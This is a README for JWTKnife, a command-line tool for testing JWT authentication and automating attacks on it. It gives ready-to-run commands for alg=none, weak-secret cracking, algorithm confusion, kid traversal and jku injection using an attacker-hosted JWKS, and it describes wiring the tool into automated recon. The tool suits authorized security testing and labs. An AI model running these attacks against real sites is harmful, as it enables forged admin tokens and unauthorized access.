### JWTKnife

JWTKnife is a JWT auth testing CLI for real request/response validation.
It supports both:
- an interactive wizard
- a non-interactive one-command mode for automation and pipeline use

It was built around the common PortSwigger-style JWT attack classes and now has a local lab harness for regression testing.

### Coverage

JWTKnife currently exercises these JWT attack families:
- Unverified / missing signature acceptance
- `alg=none`
- Weak HMAC secrets
- RSA to HMAC algorithm confusion via exposed JWKS
- RSA to HMAC algorithm confusion via `sig2n` with two server-issued tokens
- `kid` path traversal / filesystem key lookup
- Embedded `jwk` header injection
- Remote `jku` header injection

JWTs can be tested when sent via:
- `Authorization: Bearer <token>`
- Cookies
- Custom headers

### Install

```bash
go install github.com/spencer5cent/jwtknife/cmd/jwtknife@latest
```

### Runtime Dependencies

- Go: build / install
- Docker: required for the `sig2n` no-exposed-key RSA confusion path
- hashcat: optional, used only for `--hmac-wordlist`

On this VPS build, JWTKnife will try to start the Docker service automatically when a `sig2n` attack needs it, and will stop Docker afterward only if JWTKnife started it.

### Quick Start

Interactive wizard:

```bash
./jwtknife
```

Non-interactive:

```bash
./jwtknife \
  --non-interactive \
  --jwt 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<signature>' \
  --second-jwt 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMyJ9.<payload>.<signature>' \
  --placement cookie \
  --placement-name session \
  --public-url 'https://target.tld/' \
  --auth-url 'https://target.tld/my-account' \
  --admin-url 'https://target.tld/admin' \
  --callback-url 'https://attacker.tld/jwks.json' \
  --kid-mode auto \
  --output json
```

### Important Flags

- `--jwt` / `--jwt-file`: primary token
- `--second-jwt` / `--second-jwt-file`: second token for `sig2n`-style RSA confusion
- `--placement authorization|cookie|header`
- `--placement-name <name>`: cookie/header name when required
- `--public-url <url>`: baseline unauthenticated URL
- `--auth-url <url>`: baseline authenticated URL
- `--admin-url <url>`: higher-privilege/admin target URL
- `--method <verb>`: request method for baseline + attacks
- `--callback-url <url>`: hosted `jwks.json` URL for final `jku` execution
- `--kid-mode auto|custom|skip`
- `--kid-value <value>`: custom `kid` when `--kid-mode=custom`
- `--hmac-secret <secret>`: known or suspected HMAC secret
- `--hmac-wordlist <path>`: hashcat wordlist for HS* secret recovery
- `--jwk=false` / `--jku=false`: skip those attacks
- `--exhaustive`: keep running after the first success
- `--output human|json`

### HMAC Secret Recovery

If you already know the HS* secret:

```bash
./jwtknife \
  --non-interactive \
  --jwt-file ./token.txt \
  --hmac-secret weaksecret \
  --public-url 'https://target.tld/' \
  --auth-url 'https://target.tld/account' \
  --admin-url 'https://target.tld/admin'
```

If you want JWTKnife to try a wordlist with hashcat:

```bash
./jwtknife \
  --non-interactive \
  --jwt-file ./token.txt \
  --hmac-wordlist ./jwt-secrets.txt \
  --public-url 'https://target.tld/' \
  --auth-url 'https://target.tld/account' \
  --admin-url 'https://target.tld/admin'
```

### JKU Two-Step Flow

First run without `--callback-url` to generate the attacker JWKS:

```bash
./jwtknife \
  --non-interactive \
  --output json \
  --jwt-file ./token.txt \
  --public-url 'https://target.tld/' \
  --auth-url 'https://target.tld/account' \
  --admin-url 'https://target.tld/admin'
```

Extract the emitted JWKS, host it as `jwks.json`, then rerun with:

```bash
./jwtknife \
  --non-interactive \
  --jwt-file ./token.txt \
  --callback-url 'https://attacker.tld/jwks.json' \
  --public-url 'https://target.tld/' \
  --auth-url 'https://target.tld/account' \
  --admin-url 'https://target.tld/admin'
```

JWTKnife now persists the generated `jku` key material for the same source JWT so the second run uses the same keypair and `kid`.

### JSON Output

`--output json` is the intended mode for BugHunter / DeepRecon style automation.

The JSON includes:
- parsed JWT metadata
- baseline public/auth/admin observations
- attack outcomes
- forged tokens and HTTP observations for interesting/successful steps

### DeepRecon / BugHunter Integration

JWTKnife is usable from automation now, but it still needs enough context to make the results meaningful.

The best trigger conditions are:
- a live response sets a JWT automatically
- a cookie/header carrying a JWT is observed during crawling
- JS / archived data reveals a real JWT and the surrounding route context
- a target exposes OIDC / JWKS evidence suggesting JWT auth

For automatic invocation, the minimum useful inputs are:
- the JWT itself
- token placement
- one unauthenticated URL
- one authenticated URL that normally accepts the JWT
- one higher-privilege/admin URL to compare against

Recommended DeepRecon behavior:
- detect and extract JWTs from cookies, headers, JS, and archived artifacts
- record placement and token name when known
- map likely auth/admin endpoints from crawl results
- call `jwtknife --output json`
- store the JSON output next to the target’s recon artifacts for later review

If DeepRecon only knows “JWTs are used here” but does not have a real token plus target URLs, it should record the evidence and defer active JWTKnife execution until that context exists.

### Local Lab Harness

A reusable local lab harness is committed under `lab/`:

- `lab/jwt_lab.py`
- `lab/run_jwtknife_tests.py`
- `lab/requirements.txt`

You can run it with any Python virtual environment that has those requirements installed.

Example:

```bash
.venv/bin/python lab/jwt_lab.py
python3 lab/run_jwtknife_tests.py
```

### Current Notes

- `go test ./...` passes
- The major PortSwigger-style JWT lab classes are covered and revalidated locally
- This copy is tuned for this VPS environment rather than for broad cross-platform portability
